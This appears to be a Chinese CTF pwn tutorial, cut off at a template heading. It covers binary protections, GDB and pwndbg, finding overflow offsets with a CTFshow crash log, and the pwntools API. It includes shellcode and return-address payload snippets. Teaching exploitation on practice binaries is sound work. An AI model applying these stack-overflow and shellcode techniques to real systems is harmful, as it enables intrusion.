<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./racecar</span><br><span class="line"></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec vuln</span><br><span class="line"></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec vuln</span><br><span class="line"></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li><p><code>Arch</code>：二进制文件的架构</p>
<ul>
<li><code>amd64-64-little</code>： x86-64架构的64位小端序ELF可执行文件；</li>
<li><code>i386-32-little</code>：x86架构的32位小端序ELF可执行文件</li>
</ul>
</li>
<li><p><code>NX</code>：<strong>Non-eXecutable</strong>，表示数据段不可执行。</p>
<ul>
<li><code>disabled / Stack: Executable</code>：可以直接在栈/堆执行shellcode；</li>
<li><code>enabled</code>：栈和堆不能直接执行代码。</li>
</ul>
</li>
<li><p><code>PIE</code>：<strong>Position Independent Executable</strong>，表示主程序不依赖于固定的绝对内存地址，而是能够被加载到任意基址，即<code>main</code>、<code>.text</code>、<code>.data</code>、<code>.bss</code>等的运行时实际地址会变成<strong>基址+绝对内存地址</strong>（<code>base_addr + offset</code>）的形式。<strong>在系统开启 ASLR 时</strong>，每次运行主程序会选择不同的基址。</p>
<ul>
<li><p><code>No PIE</code>：程序总是加载在固定的绝对内存地址；</p>
<p>也就是说我们用工具读取到的如<code>.bss</code>的地址和程序实际运行时<code>.bss</code>的地址是有一样的。</p>
</li>
<li><p><code>PIE enabled</code>：主程序基址随机化。</p>
<p>我们用工具读取到的如<code>.bss</code>的地址和程序实际运行时<code>.bss</code>的地址是有不一样的，实际地址会等于我们读取到的地址加上一个随机的基址<code>base_addr</code>。</p>
</li>
</ul>
</li>
<li><p><code>RELRO</code>：<strong>Read-Only Relocations</strong>，程序启动时完成必要的重定位后，把用于重定位相关的数据区（尤其是 GOT 等）所在的内存页改成只读。</p>
<ul>
<li><code>Full RELRO</code>：<code>.got</code>, <code>.got.plt</code>完全只读；</li>
<li><code>Partial RELRO</code>：只部分保护，<code>.got</code>只读，但<code>.got.plt</code>仍可以修改；</li>
<li><code>No RELRO</code>：完全没有保护，<code>.got</code>, <code>.got.plt</code>均可修改。</li>
</ul>
</li>
<li><p><code>Stack</code>：是否启用了<strong>栈金丝雀（Stack Canary）</strong>：一种用于检测<strong>栈缓冲区溢出</strong>的运行时保护机制。编译器在函数的栈帧中、<strong>局部变量与返回地址之间</strong>插入一个随机（或带固定格式）的“金丝雀值”；函数返回前会检查该值是否被改写。若发生变化，说明栈上出现了越界写（很可能覆盖到返回地址），程序会立即终止或触发安全处理。</p>
<ul>
<li><code>No canary found</code>：没有栈金丝雀；</li>
<li><code>Canary found</code>：设置了栈金丝雀。</li>
</ul>
</li>
<li><p><code>Stripped</code>：是否剥离了符号信息。</p>
<ul>
<li><code>No</code>：包含函数名、符号，方便调试和逆向分析；</li>
<li><code>Yes</code>：已剥离，更难逆向，但对运行安全性影响不大。</li>
</ul>
</li>
<li><p><code>Debuginfo</code>：是否带有调试信息（DWARF 等）。</p>
<ul>
<li><code>No</code>：一般发布版本应去掉；</li>
<li><code>Yes</code>：含源码级调试信息，方便开发调试，但可能泄露过多信息。</li>
</ul>
</li>
</ul>
<p>除此之外，还有一个大部分机器/题目环境默认开启的保护措施：<strong>ASLR（Address Space Layout Randomization，地址空间布局随机化）</strong>。</p>
<p>这一种由操作系统实现的内存保护机制。在程序每次启动时，操作系统会把进程地址空间中的关键区域的基址随机化（例如栈、堆、共享库映射区（其中包括libc）、vdso 等），使代码和数据的实际地址在不同运行之间不可预测。</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h2><p>了解一下常用的基础工具，可以先安装好，但是具体操作可以先不用管，了解了后面的漏洞以及利用方法之后再回来看/查找命令即可。</p>
<h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a><strong>GDB</strong></h3><p>GDB（GNU Debugger）是 GNU 项目的调试器，主要用于调试 C/C++ 等程序。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb</span><br></pre></td></tr></table></figure>
<h4 id="安装Pwndbg"><a href="#安装Pwndbg" class="headerlink" title="安装Pwndbg"></a><strong>安装Pwndbg</strong></h4><p>pwndbg 是 GDB 的调试插件，提供栈/堆/寄存器上下文展示以及 cyclic、rop、heap、format 等命令，用于更高效地调试二进制漏洞。</p>
<p>安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) 依赖</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y git python3-venv python3-pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 拉仓库到你用户目录</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg ~/.local/share/pwndbg</span><br><span class="line"><span class="built_in">cd</span> ~/.local/share/pwndbg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 运行安装脚本（会给你创建一个本地 venv，并把 source 写入 ~/.gdbinit）</span></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<p>安装前：</p>
<p><img src="/images/image-20251011231648527.png" class="lazyload" data-srcset="/images/image-20251011231648527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011231648527"></p>
<p>安装后：</p>
<p><img src="/images/image-20251011231703933.png" class="lazyload" data-srcset="/images/image-20251011231703933.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011231703933"></p>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h4><p>1. <strong>使用GDB打开二进制文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vuln</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">gdb -q ./vuln</span><br></pre></td></tr></table></figure>
<p><code>-q</code>：quiet，安静模式，不显示启动欢迎信息。</p>
<p>或者是先普通打开gdb，然后再选择文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line"></span><br><span class="line">pwndbg&gt; file ./pwn</span><br></pre></td></tr></table></figure>
<p>2. <strong>运行程序</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">run &lt; input.txt     <span class="comment"># 用文件输入</span></span><br><span class="line">run &lt;&lt;&lt; <span class="string">&quot;AAAA&quot;</span>      <span class="comment"># 简单输入</span></span><br></pre></td></tr></table></figure>
<p>3. <strong>查看汇编代码</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br><span class="line">disass main</span><br><span class="line"></span><br><span class="line">disassemble win</span><br></pre></td></tr></table></figure>
<p>4. <strong>设置断点</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">break</span> main         <span class="comment"># 在 main 函数处断点</span></span><br><span class="line">b main</span><br></pre></td></tr></table></figure>
<p>5. <strong>查看寄存器</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info registers</span><br><span class="line">i r</span><br><span class="line"></span><br><span class="line">x/20gx <span class="variable">$rsp</span>          <span class="comment"># 查看栈内容（20 个 8 字节，从 RSP 开始）</span></span><br></pre></td></tr></table></figure>
<p>6. <strong>搜索gadgets</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rop --grep <span class="string">&quot;ret&quot;</span></span><br><span class="line"></span><br><span class="line">rop --grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line"></span><br><span class="line">rop --grep <span class="string">&quot;pop rsi ; pop r15 ; ret&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="确定返回地址偏移"><a href="#确定返回地址偏移" class="headerlink" title="确定返回地址偏移"></a><strong>确定返回地址偏移</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; | cyclic 1200 | <span class="built_in">tee</span> /tmp/pat &gt; /dev/null</span><br><span class="line"></span><br><span class="line">pwndbg&gt; run &lt; /tmp/pat</span><br><span class="line"><span class="comment"># 程序崩溃后：</span></span><br><span class="line">pwndbg&gt; x/gx <span class="variable">$rsp</span>                 <span class="comment"># 记下这里的 8 字节</span></span><br><span class="line">pwndbg&gt; cyclic -n 8 -o 0x...      <span class="comment"># 用上一步读到的值求偏移</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>| cyclic 1200 | tee /tmp/pat &gt; /dev/null</code>：生成模式串并保存到文件</p>
<ul>
<li><p><code>cyclic 1200</code>：让 <strong>pwndbg</strong> 生成长度为 <strong>1200 字节</strong>的 <strong>De Bruijn 模式串</strong>（也叫“花指纹/模式串”）。它的特性是：任意连续的 <em>n</em> 字节子串在整段里<strong>唯一</strong>（默认 n=4）。长这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; | cyclic 200 | <span class="built_in">tee</span> /tmp/pat</span><br><span class="line">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>tee /tmp/pat</code>：写入文件 <code>/tmp/pat</code>。</p>
</li>
<li><p><code>&gt; /dev/null</code>：隐藏输出。</p>
</li>
</ul>
</li>
<li><p><code>x/gx $rsp</code>：读取“将要被 ret 弹到 RIP”的 8 字节</p>
<ul>
<li><code>x</code>（examine）：查看内存。</li>
<li><code>/gx</code>：一次显示 <strong>1 个 8 字节</strong>（g=8 bytes，“giant word”）并用 <strong>十六进制</strong>（x）格式。</li>
<li><code>$rsp</code>：取 <strong>RSP 寄存器</strong> 作为要查看的内存地址。</li>
</ul>
</li>
<li><p><code>cyclic -n 8 -o 0x...</code>：用得到的返回地址反推偏移</p>
<ul>
<li><code>-o</code>（offset）：告诉 <code>cyclic</code> “这就是我在栈上读到的那 8 个字节”，请帮我算“它在刚才那段模式串里的<strong>起始位置</strong>（偏移）”。</li>
<li><code>-n 8</code>：在 64 位上我们读的是 8 字节（<code>gx</code>），要用 <strong>8 字节粒度</strong>的唯一性去匹配；否则默认 n=4 可能匹配失败或给错结果。</li>
<li><code>0x...</code>：把上一步 <code>x/gx $rsp</code> 看到的 <strong>十六进制数</strong>原样填进来。</li>
</ul>
</li>
</ul>
<p>输出：一个十进制数字，比如 <code>Found at offset 18</code> —— 这就是<strong>覆盖到返回地址的偏移</strong>（字节数）。</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h4><p><img src="/images/image-20251011234846733.png" class="lazyload" data-srcset="/images/image-20251011234846733.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011234846733"></p>
<p><img src="/images/image-20251011234917544.png" class="lazyload" data-srcset="/images/image-20251011234917544.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251011234917544"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; | cyclic 1200 | <span class="built_in">tee</span> /tmp/pat &gt; /dev/null</span><br><span class="line">pwndbg&gt; run &lt; /tmp/pat</span><br><span class="line">Starting program: /home/archer/ctf-kali/pwn/pwn38/pwn &lt; /tmp/pat</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄</span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██</span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██</span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀</span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>.There is a backdoor <span class="keyword">function</span></span><br><span class="line">    * *************************************</span><br><span class="line">Just easy ret2text&amp;&amp;64bit</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x0000000000400656 <span class="keyword">in</span> ctfshow ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────</span><br><span class="line"> RAX  0x32</span><br><span class="line"> RBX  0x7fffffffd998 —▸ 0x7fffffffdc8e ◂— <span class="string">&#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;</span></span><br><span class="line"> RCX  0x400d3f ◂— jne 0x400db5 /* <span class="string">&#x27;Just easy ret2text&amp;&amp;64bit&#x27;</span> */</span><br><span class="line"> RDX  0x32</span><br><span class="line"> RDI  0</span><br><span class="line"> RSI  0x7fffffffd866 ◂— 0x6161616161616161 (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"> R8   0</span><br><span class="line"> R9   0</span><br><span class="line"> R10  0</span><br><span class="line"> R11  0x202</span><br><span class="line"> R12  0</span><br><span class="line"> R13  0x7fffffffd9a8 —▸ 0x7fffffffdcb2 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line"> R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0</span><br><span class="line"> R15  0</span><br><span class="line"> RBP  0x6163616161616161 (<span class="string">&#x27;aaaaaaca&#x27;</span>)</span><br><span class="line"> RSP  0x7fffffffd878 ◂— 0x6164616161616161 (<span class="string">&#x27;aaaaaada&#x27;</span>)</span><br><span class="line"> RIP  0x400656 (ctfshow+31) ◂— ret</span><br><span class="line">──────────────────────────────────────────[ DISASM / x86-64 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]──────────────────────────────────────────</span><br><span class="line"> ► 0x400656 &lt;ctfshow+31&gt;    ret                                &lt;0x6164616161616161&gt;</span><br><span class="line">    ↓</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffd878 ◂— 0x6164616161616161 (<span class="string">&#x27;aaaaaada&#x27;</span>)</span><br><span class="line">01:0008│     0x7fffffffd880 ◂— 0x6165616161616161 (<span class="string">&#x27;aaaaaaea&#x27;</span>)</span><br><span class="line">02:0010│     0x7fffffffd888 ◂— 0x6166616161616161 (<span class="string">&#x27;aaaaaafa&#x27;</span>)</span><br><span class="line">03:0018│     0x7fffffffd890 ◂— 0x6167616161616161 (<span class="string">&#x27;aaaaaaga&#x27;</span>)</span><br><span class="line">04:0020│     0x7fffffffd898 —▸ 0x40066e (main) ◂— push rbp</span><br><span class="line">05:0028│     0x7fffffffd8a0 ◂— 0x100400040 /* <span class="string">&#x27;@&#x27;</span> */</span><br><span class="line">06:0030│     0x7fffffffd8a8 —▸ 0x7fffffffd998 —▸ 0x7fffffffdc8e ◂— <span class="string">&#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;</span></span><br><span class="line">07:0038│     0x7fffffffd8b0 —▸ 0x7fffffffd998 —▸ 0x7fffffffdc8e ◂— <span class="string">&#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27;</span></span><br><span class="line">─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────</span><br><span class="line"> ► 0         0x400656 ctfshow+31</span><br><span class="line">   1 0x6164616161616161 None</span><br><span class="line">   2 0x6165616161616161 None</span><br><span class="line">   3 0x6166616161616161 None</span><br><span class="line">   4 0x6167616161616161 None</span><br><span class="line">   5         0x40066e main</span><br><span class="line">   6      0x100400040 None</span><br><span class="line">   7   0x7fffffffd998 None</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffd878: 0x6164616161616161</span><br><span class="line">pwndbg&gt; cyclic -n 8 -o 0x6164616161616161</span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;aaaaaada&#x27;</span> (hex: 0x6161616161616461)</span><br><span class="line">Found at offset 18</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>所以偏移为18。</p>
<h3 id="IDA-Ghidra"><a href="#IDA-Ghidra" class="headerlink" title="IDA/Ghidra"></a><strong>IDA/Ghidra</strong></h3><p>很多时候题目只会给编译好的二进制程序，并不会给源代码。这个时候就需要用软件进行反编译以便查看伪代码。这样就不用死磕纯汇编语言了。</p>
<p><strong>下载：</strong></p>
<p><strong>IDA免费版</strong>：<a target="_blank" rel="noopener" href="https://hex-rays.com/ida-free">https://hex-rays.com/ida-free</a></p>
<p>IDA的Pro正式版收费非常贵。所以也可以考虑用完全免费开源的Ghidra。</p>
<p><strong>Ghidra</strong>：<a target="_blank" rel="noopener" href="https://ghidralite.com/">https://ghidralite.com/</a></p>
<h3 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a><strong>Pwntools</strong></h3><p><strong>Pwntools</strong> 是面向CTF/Pwn场景的Python库，提供连接服务、构造 payload、地址与数据的打包/解包、gadget 检索、shellcode 汇编以及 GDB 调试等功能，用于高效编写与调试利用代码（exploit）。</p>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a><strong>安装</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools -U</span><br></pre></td></tr></table></figure>
<h4 id="常用-API（按任务分类）"><a href="#常用-API（按任务分类）" class="headerlink" title="常用 API（按任务分类）"></a><strong>常用 API（按任务分类）</strong></h4><p><strong>1) 连接与交互</strong></p>
<ul>
<li>（假设<code>io=</code>）<code>process(path)</code> / <code>remote(host, port)</code>：<strong>本地测试/远程连接</strong></li>
<li><code>io.send(data)</code> / <code>io.sendline(data)</code>：发送数据/行</li>
<li><code>io.recv(n)</code> / <code>io.recvline()</code> / <code>io.recvuntil(delim)</code>：接收</li>
<li><code>io.sendafter(delim, data)</code> / <code>io.sendlineafter(delim, data)</code>：<strong>等提示再发</strong>（菜单题常用）</li>
<li><code>io.clean(timeout=0.1)</code>：清空缓冲垃圾输出</li>
<li><code>io.interactive()</code>：拿到<strong>交互式 shell</strong>，类似于<code>nc</code>。切换至这个模式时会自动print当前所有缓冲数据。</li>
</ul>
<p><strong>2) 打包/解包与快捷拼接</strong></p>
<ul>
<li><p><code>p32(x) / p64(x)</code>，<code>u32(b) / u64(b)</code>：整型与字节序互转（<strong>小端</strong>）</p>
</li>
<li><p><code>flat(*args, filler=b&#39;A&#39;, length=None)</code>：会把传入的各类对象智能转换成一段字节串。它会根据 <code>context</code>（架构/字节序/位宽）自动处理对齐与打包。</p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>:      shellcode,  <span class="comment"># shellcode</span></span><br><span class="line">    <span class="number">256</span>:    JMP_RSI_Adress</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">b&quot;A&quot;</span>*<span class="number">84</span>, </span><br><span class="line">    <span class="number">84</span>: win_Adress</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>fit(&#123;offset: data, ...&#125;, filler=b&#39;A&#39;)</code>：按偏移放置数据</p>
</li>
<li><p><code>cyclic(n)</code> / <code>cyclic_find(value, n=4/8)</code>：花指纹与偏移定位（也可用 pwndbg 的）</p>
</li>
</ul>
<p><strong>3) 程序信息与 ROP 工具</strong></p>
<ul>
<li><p><code>ELF(path)</code>：读符号、plt/got、段地址等</p>
<ul>
<li><p><code>elf.symbols[]</code>：从<strong>符号表</strong>读取符号（函数/全局变量）的<strong>地址</strong>。返回 <code>int</code>。比如说：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main  = elf.symbols[<span class="string">&#x27;main&#x27;</span>]	<span class="comment"># main 函数入口</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>elf.search()</code>：在<strong>可执行文件已映射的各段</strong>中按<strong>字节序列</strong>搜索内容并返回一个<strong>生成器</strong>（迭代得到每个匹配的地址）。常配合 <code>next(...)</code> 取第一个匹配。。比如说</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)		<span class="comment"># 查找&#x27;/bin/sh&#x27;字符串</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)))	<span class="comment"># 查找&#x27;pop rdi ; ret&#x27;命令</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>elf.got[]</code>：获取 <strong>GOT 表项地址</strong>（存放真实函数地址的指针位置）。返回 <code>int</code>（可写段；Full RELRO 下只读）。比如说</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">got_puts = elf.got[<span class="string">&#x27;puts&#x27;</span>]	<span class="comment"># 取 puts 的 GOT 表项地址（&amp;puts@GOT）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>elf.plt[&#39;puts&#39;]</code>：获取 <strong>PLT 跳板</strong>（桩函数）的地址。返回 <code>int</code>。比如说：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt_puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]	<span class="comment"># 调用 puts@plt，把某地址当作参数打印</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><code>ROP(elf)</code>：自动搜 gadget/拼 ROP</p>
<ul>
<li><code>rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])</code>，<code>rop.call(&#39;puts&#39;, [addr])</code>，<code>rop.chain()</code></li>
</ul>
</li>
<li><p><code>context.binary = elf</code>：让 pwntools 自动跟随架构</p>
</li>
</ul>
<p><strong>4) Shellcode / 汇编</strong></p>
<ul>
<li><code>asm(&#39;mov rax, 60; xor rdi, rdi; syscall&#39;)</code>：将汇编转为机器码</li>
<li><code>shellcraft.sh()</code> / <code>asm(shellcraft.sh())</code>： <code>/bin/sh</code>的Shellcode。</li>
<li><code>disasm(b&#39;\x90\x90\xcc&#39;)</code>：反汇编字节流</li>
</ul>
<p><strong>5) 调试辅助</strong></p>
<ul>
<li><code>gdb.attach(io, gdbscript=&#39;b *0x401234\nc&#39;)</code>：本地挂 gdb</li>
<li><code>gdb.debug([path], gdbscript=...)</code>：由 gdb 启动进程（便于断点）</li>
</ul>
<p><strong>6) 杂项</strong></p>
<ul>
<li><code>hexdump(data)</code>：十六进制打印</li>
<li><code>log.info()/success()/warning()</code>：美化日志</li>
<li><code>context.timeout = 2</code>：全局超时</li>
<li><code>pause()</code>：脚本暂停，手动操作后继续</li>
</ul>
<h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a><strong>模板</strong></h4><ul>
